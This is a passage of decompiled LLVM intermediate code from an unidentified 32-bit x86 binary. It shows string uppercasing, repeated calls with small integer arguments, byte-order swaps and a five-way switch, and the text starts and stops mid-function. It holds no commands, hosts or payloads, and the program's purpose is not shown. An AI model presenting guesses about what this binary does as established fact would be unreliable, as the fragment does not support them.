  store i1 %v12_80482b4212, i1* %zf.global-to-local, align 1
  %v7_80482b6213 = icmp sgt i32 %v2_80482a5211, 0
  br i1 %v7_80482b6213, label %dec_label_pc_80482b8, label %dec_label_pc_80482dd

dec_label_pc_80482b8:                             ; preds = %dec_label_pc_804829d.preheader, %dec_label_pc_80482cc
  %v4_80482a0216 = phi i32 [ %v4_80482a0, %dec_label_pc_80482cc ], [ %v6_80481cf, %dec_label_pc_804829d.preheader ]
  %v4_80482be215 = phi i32 [ %v1_80482d3, %dec_label_pc_80482cc ], [ 0, %dec_label_pc_804829d.preheader ]
  %v3_80482b8214 = phi i8* [ %v3_80482a0.pre, %dec_label_pc_80482cc ], [ %tmp237, %dec_label_pc_804829d.preheader ]
  %v2_80482bc = add i32 %v4_80482be215, %v4_80482a0216
  %v12_80482bc = icmp eq i32 %v2_80482bc, 0
  store i1 %v12_80482bc, i1* %zf.global-to-local, align 1
  store i32 %v2_80482bc, i32* %ecx.global-to-local, align 4
  %v1_80482be = inttoptr i32 %v2_80482bc to i8*
  %v2_80482be = load i8, i8* %v1_80482be, align 1
  %v3_80482be = zext i8 %v2_80482be to i32
  %v5_80482be = and i32 %v4_80482be215, -256
  %v6_80482be = or i32 %v3_80482be, %v5_80482be
  store i32 %v6_80482be, i32* %edx.global-to-local, align 4
  %v1_80482c0 = add i32 %v6_80482be, -97
  store i32 %v1_80482c0, i32* %eax.global-to-local, align 4
  %v1_80482c3 = trunc i32 %v1_80482c0 to i8
  %v11_80482c3 = icmp eq i8 %v1_80482c3, 25
  store i1 %v11_80482c3, i1* %zf.global-to-local, align 1
  %v8_80482c5 = icmp ugt i8 %v1_80482c3, 25
  br i1 %v8_80482c5, label %dec_label_pc_80482cc, label %dec_label_pc_80482c7

dec_label_pc_80482c7:                             ; preds = %dec_label_pc_80482b8
  %v1_80482c7 = add i32 %v6_80482be, -32
  store i32 %v1_80482c7, i32* %eax.global-to-local, align 4
  %v1_80482ca = trunc i32 %v1_80482c7 to i8
  store i8 %v1_80482ca, i8* %v1_80482be, align 1
  %v0_804829d.pre.pre = load i32, i32* @esp, align 4
  %v3_80482a0.pre.pre = load i8*, i8** %stack_var_-20900, align 4
  br label %dec_label_pc_80482cc

dec_label_pc_80482cc:                             ; preds = %dec_label_pc_80482b8, %dec_label_pc_80482c7
  %v3_80482a0.pre = phi i8* [ %v3_80482b8214, %dec_label_pc_80482b8 ], [ %v3_80482a0.pre.pre, %dec_label_pc_80482c7 ]
  %v0_804829d.pre = phi i32 [ %v15_8048194, %dec_label_pc_80482b8 ], [ %v0_804829d.pre.pre, %dec_label_pc_80482c7 ]
  %v1_80482d3 = add i32 %v4_80482be215, 1
  %v9_804829d = icmp eq i32 %v0_804829d.pre, 12
  store i1 %v9_804829d, i1* %zf.global-to-local, align 1
  %v4_80482a0 = ptrtoint i8* %v3_80482a0.pre to i32
  store i32 %v4_80482a0, i32* %eax.global-to-local, align 4
  store i32 %v4_80482a0, i32* %stack_var_-20972, align 4
  %v2_80482a5 = call i32 @function_8051c40(i8* %v3_80482a0.pre)
  store i32 %v2_80482a5, i32* %eax.global-to-local, align 4
  store i32 %v1_80482d3, i32* %edx.global-to-local, align 4
  %v12_80482b4 = icmp eq i32 %v2_80482a5, %v1_80482d3
  store i1 %v12_80482b4, i1* %zf.global-to-local, align 1
  %v7_80482b6 = icmp sgt i32 %v2_80482a5, %v1_80482d3
  br i1 %v7_80482b6, label %dec_label_pc_80482b8, label %dec_label_pc_80482dd

dec_label_pc_80482dd:                             ; preds = %dec_label_pc_80482cc, %dec_label_pc_804829d.preheader
  %v0_80482dd = load i32, i32* @edi, align 4
  %v7_80482e7 = icmp sgt i32 %v0_80482dd, 256
  %.v0_80482dd = select i1 %v7_80482e7, i32 256, i32 %v0_80482dd
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 36, i32* %stack_var_-20972, align 4
  %v2_80482f6 = call i32 @function_80512f0(i8 36)
  store i32 %v2_80482f6, i32* %eax.global-to-local, align 4
  store i32 37, i32* %stack_var_-20972, align 4
  %v2_8048302 = call i32 @function_80512f0(i8 37)
  store i32 %v2_8048302, i32* %eax.global-to-local, align 4
  store i32 38, i32* %stack_var_-20972, align 4
  %v2_804830e = call i32 @function_80512f0(i8 38)
  store i32 %v2_804830e, i32* %eax.global-to-local, align 4
  store i32 39, i32* %stack_var_-20972, align 4
  %v2_804831a = call i32 @function_80512f0(i8 39)
  store i32 %v2_804831a, i32* %eax.global-to-local, align 4
  store i32 40, i32* %stack_var_-20972, align 4
  %v2_8048326 = call i32 @function_80512f0(i8 40)
  store i32 %v2_8048326, i32* %eax.global-to-local, align 4
  store i32 41, i32* %stack_var_-20972, align 4
  %v2_8048332 = call i32 @function_80512f0(i8 41)
  store i32 %v2_8048332, i32* %eax.global-to-local, align 4
  store i32 42, i32* %stack_var_-20972, align 4
  %v2_804833e = call i32 @function_80512f0(i8 42)
  store i32 %v2_804833e, i32* %eax.global-to-local, align 4
  store i32 43, i32* %stack_var_-20972, align 4
  %v2_804834a = call i32 @function_80512f0(i8 43)
  store i32 %v2_804834a, i32* %eax.global-to-local, align 4
  store i32 44, i32* %stack_var_-20972, align 4
  %v2_8048356 = call i32 @function_80512f0(i8 44)
  store i32 %v2_8048356, i32* %eax.global-to-local, align 4
  store i32 45, i32* %stack_var_-20972, align 4
  %v2_8048362 = call i32 @function_80512f0(i8 45)
  store i32 %v2_8048362, i32* %eax.global-to-local, align 4
  store i32 46, i32* %stack_var_-20972, align 4
  %v2_804836e = call i32 @function_80512f0(i8 46)
  %v2_8048373 = load i32, i32* %stack_var_-20972, align 4
  store i32 %v2_8048373, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %.v0_80482dd, i32* @esi, align 4
  store i32 %.v0_80482dd, i32* %stack_var_-20972, align 4
  %v2_804837f = sext i32 %.v0_80482dd to i64
  %v3_804837f = call i32 @function_80532e8(i64 %v2_804837f, i32 3140)
  store i32 %v3_804837f, i32* %eax.global-to-local, align 4
  store i32 %v3_804837f, i32* @esi, align 4
  store i32 %.v0_80482dd, i32* @ebx, align 4
  %v1_8048391 = icmp eq i32 %.v0_80482dd, 0
  store i1 %v1_8048391, i1* %zf.global-to-local, align 1
  %tmp136 = icmp slt i32 %.v0_80482dd, 1
  br i1 %tmp136, label %dec_label_pc_80484be, label %dec_label_pc_8048399

dec_label_pc_8048399:                             ; preds = %dec_label_pc_80482dd
  %v0_8048399 = load i32, i32* @ebp, align 4
  %v1_8048399 = trunc i32 %v0_8048399 to i8
  store i32 0, i32* @ebp, align 4
  %v1_804839d5 = urem i32 %v0_8048399, 256
  %v3_804839d = icmp eq i8 %v1_8048399, 0
  store i1 %v3_804839d, i1* %zf.global-to-local, align 1
  store i32 %v1_804839d5, i32* @ecx, align 4
  %v2_80483e1 = inttoptr i32 %v1_804839d5 to i8*
  %v2_8049f7d = inttoptr i32 %tmp to i8*
  %v1_8049f3f = trunc i32 %tmp to i8
  %v2_804a072 = inttoptr i32 %v0_804816e to i32*
  br label %dec_label_pc_80483a7

dec_label_pc_80483a7:                             ; preds = %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge, %dec_label_pc_8048399
  %v0_80483a9 = phi i32 [ %v0_80483a9.pre, %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge ], [ %v3_804837f, %dec_label_pc_8048399 ]
  %v0_80483a7 = phi i32 [ %v4_8049f85, %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge ], [ 0, %dec_label_pc_8048399 ]
  store i32 %v0_80483a7, i32* %edx.global-to-local, align 4
  %v1_80483a9 = add i32 %v0_80483a9, 4
  %v2_80483a9 = inttoptr i32 %v1_80483a9 to i8*
  store i8 0, i8* %v2_80483a9, align 1
  %v0_80483ad = load i32, i32* %edx.global-to-local, align 4
  %v2_80483ad = ashr i32 %v0_80483ad, 31
  %v3_80483ad = icmp eq i32 %v2_80483ad, 0
  store i1 %v3_80483ad, i1* %zf.global-to-local, align 1
  store i32 %v2_80483ad, i32* %edx.global-to-local, align 4
  %v0_80483b0 = load i32, i32* @ebp, align 4
  store i32 %v0_80483b0, i32* %eax.global-to-local, align 4
  %v0_80483b2 = load i32, i32* @esp, align 4
  %v1_80483b2 = add i32 %v0_80483b2, 88
  %v2_80483b2 = inttoptr i32 %v1_80483b2 to i32*
  %v3_80483b2 = load i32, i32* %v2_80483b2, align 4
  %v5_80483b2 = zext i32 %v0_80483b0 to i64
  %v7_80483b2 = zext i32 %v2_80483ad to i64
  %v8_80483b2 = mul nuw i64 %v7_80483b2, 4294967296
  %v9_80483b2 = or i64 %v5_80483b2, %v8_80483b2
  %v10_80483b2 = zext i32 %v3_80483b2 to i64
  %v11_80483b2 = sdiv i64 %v9_80483b2, %v10_80483b2
  %v12_80483b2 = trunc i64 %v11_80483b2 to i32
  store i32 %v12_80483b2, i32* %eax.global-to-local, align 4
  %v13_80483b2 = srem i64 %v9_80483b2, %v10_80483b2
  %v14_80483b2 = trunc i64 %v13_80483b2 to i32
  store i32 %v14_80483b2, i32* %edx.global-to-local, align 4
  %v1_80483b6 = add i32 %v0_80483b2, 20932
  %v2_80483b6 = inttoptr i32 %v1_80483b6 to i32*
  %v3_80483b6 = load i32, i32* %v2_80483b6, align 4
  store i32 %v3_80483b6, i32* %eax.global-to-local, align 4
  %v0_80483bd = load i32, i32* @esi, align 4
  %v1_80483bd = inttoptr i32 %v0_80483bd to i32*
  store i32 -1, i32* %v1_80483bd, align 4
  %v0_80483c3 = load i32, i32* %edx.global-to-local, align 4
  %v0_80483c6 = load i32, i32* %eax.global-to-local, align 4
  %v2_80483c6 = mul i32 %v0_80483c3, 24
  %v3_80483c6 = add i32 %v0_80483c6, %v2_80483c6
  store i32 %v3_80483c6, i32* @edi, align 4
  %v0_80483c9 = load i32, i32* @esi, align 4
  %v1_80483c9 = add i32 %v0_80483c9, 532
  store i32 %v1_80483c9, i32* %edx.global-to-local, align 4
  %v1_80483cf = load i32, i32* @esp, align 4
  %v2_80483cf = add i32 %v1_80483cf, 36
  %v3_80483cf = inttoptr i32 %v2_80483cf to i32*
  store i32 %v1_80483c9, i32* %v3_80483cf, align 4
  %v0_80483d3 = load i32, i32* @edi, align 4
  %v1_80483d3 = add i32 %v0_80483d3, 16
  %v2_80483d3 = inttoptr i32 %v1_80483d3 to i32*
  %v3_80483d3 = load i32, i32* %v2_80483d3, align 4
  store i32 %v3_80483d3, i32* %eax.global-to-local, align 4
  %v1_80483d6 = load i32, i32* @esi, align 4
  %v2_80483d6 = add i32 %v1_80483d6, 16
  %v3_80483d6 = inttoptr i32 %v2_80483d6 to i32*
  store i32 %v3_80483d3, i32* %v3_80483d6, align 4
  %v0_80483d9 = load i32, i32* @ecx, align 4
  %v1_80483d9 = load i32, i32* @esp, align 4
  %v2_80483d9 = add i32 %v1_80483d9, -4
  %v3_80483d9 = inttoptr i32 %v2_80483d9 to i32*
  store i32 %v0_80483d9, i32* %v3_80483d9, align 4
  %v0_80483da = load i32, i32* @ecx, align 4
  %v2_80483da = add i32 %v1_80483d9, -8
  %v3_80483da = inttoptr i32 %v2_80483da to i32*
  store i32 %v0_80483da, i32* %v3_80483da, align 4
  %v1_80483db = add i32 %v1_80483d9, 64
  %v2_80483db = inttoptr i32 %v1_80483db to i32*
  %v3_80483db = load i32, i32* %v2_80483db, align 4
  store i32 %v3_80483db, i32* %eax.global-to-local, align 4
  %v2_80483df = add i32 %v1_80483d9, -12
  %v3_80483df = inttoptr i32 %v2_80483df to i32*
  store i32 %v3_80483db, i32* %v3_80483df, align 4
  %v0_80483e0 = load i32, i32* %edx.global-to-local, align 4
  %v2_80483e0 = add i32 %v1_80483d9, -16
  %v3_80483e0 = inttoptr i32 %v2_80483e0 to i32*
  store i32 %v0_80483e0, i32* %v3_80483e0, align 4
  %v3_80483e1 = call i32 @function_8051c60(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80483e1, i32* %eax.global-to-local, align 4
  %v0_80483e6 = load i32, i32* @esp, align 4
  %v1_80483e6 = add i32 %v0_80483e6, 16
  %v6_80483e6 = icmp eq i32 %v1_80483e6, 0
  store i1 %v6_80483e6, i1* %zf.global-to-local, align 1
  %v0_80483e9 = load i32, i32* @esi, align 4
  %v1_80483e9 = add i32 %v0_80483e9, 532
  %v2_80483e9 = inttoptr i32 %v1_80483e9 to i8*
  %v3_80483e9 = load i8, i8* %v2_80483e9, align 1
  %v12_80483e9 = icmp eq i8 %v3_80483e9, 47
  store i1 %v12_80483e9, i1* %zf.global-to-local, align 1
  br i1 %v12_80483e9, label %dec_label_pc_804841e, label %dec_label_pc_80483f2

dec_label_pc_80483f2:                             ; preds = %dec_label_pc_80483a7
  %v9_80483f2 = icmp eq i32 %v0_80483e6, -4
  store i1 %v9_80483f2, i1* %zf.global-to-local, align 1
  %v1_80483f5 = add i32 %v0_80483e6, 52
  %v2_80483f5 = inttoptr i32 %v1_80483f5 to i32*
  %v3_80483f5 = load i32, i32* %v2_80483f5, align 4
  store i32 %v3_80483f5, i32* %eax.global-to-local, align 4
  %v3_80483f9 = inttoptr i32 %v0_80483e6 to i32*
  store i32 %v3_80483f5, i32* %v3_80483f9, align 4
  %v2_80483fa = call i32 @function_8051c40(i8* %v2_80483e1)
  store i32 %v2_80483fa, i32* %eax.global-to-local, align 4
  %v0_80483ff = load i32, i32* @esp, align 4
  %v9_80483ff = icmp eq i32 %v0_80483ff, -12
  store i1 %v9_80483ff, i1* %zf.global-to-local, align 1
  %v2_8048402 = add i32 %v0_80483ff, 8
  %v3_8048402 = inttoptr i32 %v2_8048402 to i32*
  store i32 %v2_80483fa, i32* %v3_8048402, align 4
  %v1_8048403 = add i32 %v0_80483ff, 52
  %v2_8048403 = inttoptr i32 %v1_8048403 to i32*
  %v3_8048403 = load i32, i32* %v2_8048403, align 4
  %v2_8048407 = add i32 %v0_80483ff, 4
  %v3_8048407 = inttoptr i32 %v2_8048407 to i32*
  store i32 %v3_8048403, i32* %v3_8048407, align 4
  %v0_8048408 = load i32, i32* @esi, align 4
  %v1_8048408 = add i32 %v0_8048408, 533
  store i32 %v1_8048408, i32* %eax.global-to-local, align 4
  %v3_804840e = inttoptr i32 %v0_80483ff to i32*
  store i32 %v1_8048408, i32* %v3_804840e, align 4
  %v4_804840f = call i32 @function_8052743(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804840f, i32* %eax.global-to-local, align 4
  %v0_8048414 = load i32, i32* @esi, align 4
  %v1_8048414 = add i32 %v0_8048414, 532
  %v2_8048414 = inttoptr i32 %v1_8048414 to i8*
  store i8 47, i8* %v2_8048414, align 1
  %v0_804841b = load i32, i32* @esp, align 4
  %v1_804841b = add i32 %v0_804841b, 16
  %v6_804841b = icmp eq i32 %v1_804841b, 0
  store i1 %v6_804841b, i1* %zf.global-to-local, align 1
  %v0_804841e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804841e

dec_label_pc_804841e:                             ; preds = %dec_label_pc_80483a7, %dec_label_pc_80483f2
  %v1_804841e = phi i32 [ %v1_80483e6, %dec_label_pc_80483a7 ], [ %v1_804841b, %dec_label_pc_80483f2 ]
  %v0_804841e = phi i32 [ %v3_80483e1, %dec_label_pc_80483a7 ], [ %v0_804841e.pre, %dec_label_pc_80483f2 ]
  %v2_804841e = add i32 %v1_804841e, -4
  %v3_804841e = inttoptr i32 %v2_804841e to i32*
  store i32 %v0_804841e, i32* %v3_804841e, align 4
  %v0_804841f = load i32, i32* %eax.global-to-local, align 4
  %v2_804841f = add i32 %v1_804841e, -8
  %v3_804841f = inttoptr i32 %v2_804841f to i32*
  store i32 %v0_804841f, i32* %v3_804841f, align 4
  %v1_8048420 = add i32 %v1_804841e, 56
  %v2_8048420 = inttoptr i32 %v1_8048420 to i32*
  %v3_8048420 = load i32, i32* %v2_8048420, align 4
  %v2_8048424 = add i32 %v1_804841e, -12
  %v3_8048424 = inttoptr i32 %v2_8048424 to i32*
  store i32 %v3_8048420, i32* %v3_8048424, align 4
  %v0_8048425 = load i32, i32* @esi, align 4
  %v1_8048425 = add i32 %v0_8048425, 1440
  store i32 %v1_8048425, i32* %eax.global-to-local, align 4
  %v2_804842b = add i32 %v1_804841e, -16
  %v3_804842b = inttoptr i32 %v2_804842b to i32*
  store i32 %v1_8048425, i32* %v3_804842b, align 4
  %v3_804842c = call i32 @function_8051c60(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804842c, i32* %eax.global-to-local, align 4
  %v0_8048431 = load i32, i32* @esp, align 4
  %v1_8048431 = inttoptr i32 %v0_8048431 to i32*
  %v2_8048431 = load i32, i32* %v1_8048431, align 4
  store i32 %v2_8048431, i32* @ebx, align 4
  %v0_8048433 = load i32, i32* @esi, align 4
  %v1_8048433 = add i32 %v0_8048433, 1431
  store i32 %v1_8048433, i32* %eax.global-to-local, align 4
  %v1_8048439 = add i32 %v0_8048431, 72
  %v2_8048439 = inttoptr i32 %v1_8048439 to i32*
  %v3_8048439 = load i32, i32* %v2_8048439, align 4
  store i32 %v3_8048439, i32* %ecx.global-to-local, align 4
  %v2_804843d = add i32 %v0_8048431, 4
  %v3_804843d = inttoptr i32 %v2_804843d to i32*
  store i32 %v3_8048439, i32* %v3_804843d, align 4
  %v0_804843e = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804843e, i32* %v1_8048431, align 4
  %v3_804843f = call i32 @function_8051c60(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804843f, i32* %eax.global-to-local, align 4
  %v0_8048444 = load i32, i32* @esp, align 4
  %v1_8048444 = inttoptr i32 %v0_8048444 to i32*
  %v2_8048444 = load i32, i32* %v1_8048444, align 4
  store i32 %v2_8048444, i32* %eax.global-to-local, align 4
  %v3_8048444 = add i32 %v0_8048444, 4
  %v1_8048445 = inttoptr i32 %v3_8048444 to i32*
  %v2_8048445 = load i32, i32* %v1_8048445, align 4
  store i32 %v2_8048445, i32* %edx.global-to-local, align 4
  %v1_8048446 = add i32 %v0_8048444, 76
  %v2_8048446 = inttoptr i32 %v1_8048446 to i32*
  %v3_8048446 = load i32, i32* %v2_8048446, align 4
  store i32 %v3_8048446, i32* %v1_8048445, align 4
  %v0_804844b = load i32, i32* @esi, align 4
  %v1_804844b = add i32 %v0_804844b, 789
  store i32 %v1_804844b, i32* %eax.global-to-local, align 4
  store i32 %v1_804844b, i32* %v1_8048444, align 4
  %v3_8048452 = call i32 @function_8051c60(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048452, i32* %eax.global-to-local, align 4
  %v0_8048457 = load i32, i32* @esp, align 4
  %v6_8048457 = icmp eq i32 %v0_8048457, -16
  store i1 %v6_8048457, i1* %zf.global-to-local, align 1
  %v0_804845a = load i32, i32* @edi, align 4
  %v1_804845a = add i32 %v0_804845a, 20
  %v2_804845a = inttoptr i32 %v1_804845a to i8*
  %v3_804845a = load i8, i8* %v2_804845a, align 1
  %v12_804845a = icmp eq i8 %v3_804845a, 31
  store i1 %v12_804845a, i1* %zf.global-to-local, align 1
  %tmp238 = icmp ult i8 %v3_804845a, 32
  br i1 %tmp238, label %dec_label_pc_8048460, label %dec_label_pc_804848a

dec_label_pc_8048460:                             ; preds = %dec_label_pc_804841e
  %v1_8048460 = add i32 %v0_804845a, 16
  %v2_8048460 = inttoptr i32 %v1_8048460 to i32*
  %v3_8048460 = load i32, i32* %v2_8048460, align 4
  store i32 %v3_8048460, i32* %ebx.global-to-local, align 4
  %v1_8048463 = call i32 @function_804f070(i32 %v1_804839d5)
  store i32 %v1_8048463, i32* %eax.global-to-local, align 4
  %v1_8048468 = trunc i32 %v3_8048460 to i16
  %v2_8048468 = call i16 @llvm.bswap.i16(i16 %v1_8048468)
  %v3_8048468 = zext i16 %v2_8048468 to i32
  %v1_804846c = udiv i32 %v3_8048460, 65536
  %v2_804846c = mul nuw i32 %v3_8048468, 65536
  %v1_804846f = trunc i32 %v1_804846c to i16
  %v2_804846f = call i16 @llvm.bswap.i16(i16 %v1_804846f)
  %v3_804846f = zext i16 %v2_804846f to i32
  %v6_804846f = or i32 %v3_804846f, %v2_804846c
  store i32 %v6_804846f, i32* %ebx.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_8048475 = load i32, i32* @edi, align 4
  %v1_8048475 = add i32 %v0_8048475, 20
  %v2_8048475 = inttoptr i32 %v1_8048475 to i8*
  %v3_8048475 = load i8, i8* %v2_8048475, align 1
  %v4_8048475 = zext i8 %v3_8048475 to i32
  store i32 %v4_8048475, i32* %ecx.global-to-local, align 4
  %tmp242 = urem i8 %v3_8048475, 32
  %v4_8048478 = icmp eq i8 %tmp242, 0
  br i1 %v4_8048478, label %bb137, label %bb

bb:                                               ; preds = %dec_label_pc_8048460
  %v2_8048478 = zext i8 %tmp242 to i32
  %v5_8048478 = lshr i32 %v1_8048463, %v2_8048478
  %v6_8048478 = icmp eq i32 %v5_8048478, 0
  store i1 %v6_8048478, i1* %zf.global-to-local, align 1
  store i32 %v5_8048478, i32* %eax.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_8048460, %bb
  %v0_804847a = phi i32 [ %v1_8048463, %dec_label_pc_8048460 ], [ %v5_8048478, %bb ]
  %v2_804847a = add i32 %v0_804847a, %v6_804846f
  %v12_804847a = icmp eq i32 %v2_804847a, 0
  store i1 %v12_804847a, i1* %zf.global-to-local, align 1
  %v1_804847c = trunc i32 %v2_804847a to i16
  %v2_804847c = call i16 @llvm.bswap.i16(i16 %v1_804847c)
  %v3_804847c = zext i16 %v2_804847c to i32
  %v1_8048480 = udiv i32 %v2_804847a, 65536
  %v2_8048480 = mul nuw i32 %v3_804847c, 65536
  %v1_8048483 = trunc i32 %v1_8048480 to i16
  %v2_8048483 = call i16 @llvm.bswap.i16(i16 %v1_8048483)
  %v3_8048483 = zext i16 %v2_8048483 to i32
  %v6_8048483 = or i32 %v3_8048483, %v2_8048480
  store i32 %v6_8048483, i32* %eax.global-to-local, align 4
  %v1_8048487 = load i32, i32* @esi, align 4
  %v2_8048487 = add i32 %v1_8048487, 16
  %v3_8048487 = inttoptr i32 %v2_8048487 to i32*
  store i32 %v6_8048483, i32* %v3_8048487, align 4
  br label %dec_label_pc_804848a

dec_label_pc_804848a:                             ; preds = %dec_label_pc_804841e, %bb137
  %v1_804848a = call i32 @function_804f070(i32 %v1_804839d5)
  %v2_804848a = sext i32 %v1_804848a to i64
  store i32 -858993459, i32* @ecx, align 4
  store i32 %v1_804848a, i32* @ebx, align 4
  %v5_8048496 = mul nuw nsw i64 %v2_804848a, 3435973837
  %v6_8048496 = trunc i64 %v5_8048496 to i32
  %v7_8048496 = udiv i64 %v5_8048496, 4294967296
  %v8_8048496 = trunc i64 %v7_8048496 to i32
  store i32 %v6_8048496, i32* %eax.global-to-local, align 4
  store i32 %v8_8048496, i32* %edx.global-to-local, align 4
  %v1_8048498 = load i32, i32* @esp, align 4
  %v2_8048498 = add i32 %v1_8048498, 12
  %v3_8048498 = inttoptr i32 %v2_8048498 to i32*
  store i32 %v8_8048496, i32* %v3_8048498, align 4
  %v0_804849c = load i32, i32* %eax.global-to-local, align 4
  %v1_804849c = load i32, i32* @esp, align 4
  %v2_804849c = add i32 %v1_804849c, 8
  %v3_804849c = inttoptr i32 %v2_804849c to i32*
  store i32 %v0_804849c, i32* %v3_804849c, align 4
  %v0_80484a0 = load i32, i32* @esp, align 4
  %v1_80484a0 = add i32 %v0_80484a0, 12
  %v2_80484a0 = inttoptr i32 %v1_80484a0 to i32*
  %v3_80484a0 = load i32, i32* %v2_80484a0, align 4
  %v0_80484a4 = load i32, i32* @ebx, align 4
  %v2_80484a6 = udiv i32 %v3_80484a0, 4
  %v3_80484a9 = mul i32 %v2_80484a6, 5
  store i32 %v3_80484a9, i32* %edx.global-to-local, align 4
  %v2_80484ac = sub i32 %v0_80484a4, %v3_80484a9
  store i32 %v2_80484ac, i32* %eax.global-to-local, align 4
  %v9_80484ae = icmp eq i32 %v2_80484ac, 4
  store i1 %v9_80484ae, i1* %zf.global-to-local, align 1
  switch i32 %v2_80484ac, label %dec_label_pc_8049f6a [
    i32 0, label %dec_label_pc_8049f3a
    i32 1, label %dec_label_pc_8049fc3
    i32 2, label %dec_label_pc_8049ff8
    i32 3, label %dec_label_pc_804a062
  ]

dec_label_pc_80484be:                             ; preds = %dec_label_pc_80482dd
  %v1_80484be = add i32 %v3_804837f, 16
  store i32 %v1_80484be, i32* %edx.global-to-local, align 4
  %v2_80484c1 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_80484c1, i32* %ecx.global-to-local, align 4
  %v2_80484c8 = ptrtoint i32* %stack_var_-344 to i32
  store i32 %v2_80484c8, i32* %eax.global-to-local, align 4
  %v1_80484cf = add i32 %v3_804837f, 1452
  %v9_80484cf = icmp eq i32 %v1_80484cf, 0
  store i1 %v9_80484cf, i1* %zf.global-to-local, align 1
  store i32 %v1_80484cf, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80484e5.preheader

dec_label_pc_80484e5.preheader:                   ; preds = %dec_label_pc_80484be, %dec_label_pc_8049f8f
  %v0_80484e5.pre = phi i32 [ %v0_80484e5.pre.pre, %dec_label_pc_8049f8f ], [ %v15_8048194, %dec_label_pc_80484be ]
  %stack_var_-20924.0.ph = phi i32 [ %tmp, %dec_label_pc_8049f8f ], [ %v1_80484cf, %dec_label_pc_80484be ]
  %v1_80484ea = inttoptr i32 %stack_var_-20924.0.ph to i32*
  %v1_8048752 = inttoptr i32 %stack_var_-20924.0.ph to i8*
  %v1_804887b = trunc i32 %stack_var_-20924.0.ph to i8
  %v3_8048aab = sext i32 %stack_var_-20924.0.ph to i64
  br label %dec_label_pc_80484e5

dec_label_pc_80484e5:                             ; preds = %dec_label_pc_8048ce9, %dec_label_pc_8048cdd, %dec_label_pc_80484e5, %dec_label_pc_8048d91, %dec_label_pc_80484e5.preheader
  %v0_80484e5 = phi i32 [ %v0_80484e5.pre, %dec_label_pc_80484e5.preheader ], [ %v1_804850c, %dec_label_pc_80484e5 ], [ %v0_8048597, %dec_label_pc_8048cdd ], [ %v1_8048d39, %dec_label_pc_8048ce9 ], [ %v0_8048da7, %dec_label_pc_8048d91 ]
  %v9_80484e5 = icmp eq i32 %v0_80484e5, 12
  store i1 %v9_80484e5, i1* %zf.global-to-local, align 1
  %v1_80484e8 = add i32 %v0_80484e5, -16
  %v2_80484e8 = inttoptr i32 %v1_80484e8 to i32*
  store i32 0, i32* %v2_80484e8, align 4
  %v2_80484ea = call i32 @function_80524a2(i32* %v1_80484ea)
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_80484f4 = load i32, i32* @esp, align 4
  %v2_80484f4 = add i32 %v1_80484f4, 96
  %v3_80484f4 = inttoptr i32 %v2_80484f4 to i32*
  store i32 %v2_80484ea, i32* %v3_80484f4, align 4
  %v0_80484f8 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80484f8, i32* %ecx.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80484fc = load i32, i32* @esp, align 4
  %v1_80484fc = add i32 %v0_80484fc, 40
  %v2_80484fc = inttoptr i32 %v1_80484fc to i32*
  %v3_80484fc = load i32, i32* %v2_80484fc, align 4
  %v4_80484fc = inttoptr i32 %v3_80484fc to i8*
  store i32 %v3_80484fc, i32* %edi.global-to-local, align 4
  %v5_8048501 = call i8* @_memset(i8* %v4_80484fc, i32 0, i32 %v0_80484f8)
  %v0_8048503 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8048503, i32* %ecx.global-to-local, align 4
  %v0_8048505 = load i32, i32* @esp, align 4
  %v1_8048505 = add i32 %v0_8048505, 36
  %v2_8048505 = inttoptr i32 %v1_8048505 to i32*
  %v3_8048505 = load i32, i32* %v2_8048505, align 4
  %v4_8048505 = inttoptr i32 %v3_8048505 to i8*
  store i32 %v3_8048505, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v2_804850a = load i32, i32* %eax.global-to-local, align 4
  %v5_804850a = call i8* @_memset(i8* %v4_8048505, i32 %v2_804850a, i32 %v0_8048503)
  %v6_804850a = ptrtoint i8* %v5_804850a to i32
  store i32 %v6_804850a, i32* @ecx, align 4
  %v0_804850c = load i32, i32* @esp, align 4
  %v1_804850c = add i32 %v0_804850c, 16
  %v1_804850f = add i32 %v0_804850c, 128
  %v2_804850f = inttoptr i32 %v1_804850f to i32*
  %v3_804850f = load i32, i32* %v2_804850f, align 4
  store i32 %v3_804850f, i32* %esi.global-to-local, align 4
  %v1_8048513 = icmp eq i32 %v3_804850f, 0
  store i1 %v1_8048513, i1* %zf.global-to-local, align 1
  %tmp138 = icmp slt i32 %v3_804850f, 1
  br i1 %tmp138, label %dec_label_pc_80484e5, label %dec_label_pc_8048517

dec_label_pc_8048517:                             ; preds = %dec_label_pc_80484e5
  %v1_8048517 = add i32 %v0_804850c, 64
  %v2_8048517 = inttoptr i32 %v1_8048517 to i32*
  %v3_8048517 = load i32, i32* %v2_8048517, align 4
  store i32 %v3_8048517, i32* %esi.global-to-local, align 4
  %v1_804851b = add i32 %v0_804850c, 44
  %v2_804851b = inttoptr i32 %v1_804851b to i32*
  %v3_804851b = load i32, i32* %v2_804851b, align 4
  store i32 %v3_804851b, i32* @ebp, align 4
  %v1_804851f = add i32 %v3_8048517, 1440
  %v6_804851f = icmp eq i32 %v1_804851f, 0
